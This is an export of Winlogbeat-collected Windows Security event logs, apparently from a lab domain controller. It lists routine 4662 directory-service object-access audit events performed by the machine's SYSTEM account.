"May 28, 2026 @ 21:03:15.324"	"xxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110253	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.324"	"xhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110252	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.324"	"xRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110251	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.322"	"xBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110246	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.322"	"wxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110245	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.322"	"whDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110244	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.321"	"wRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110237	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.321"	"wBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110236	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:15.321"	"vxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:17.026"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110235	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"vhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.020"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110231	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"vRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.020"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110230	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"vBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.020"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110229	"Directory Service Access"	" - "	" - "	" - "	" - "	-
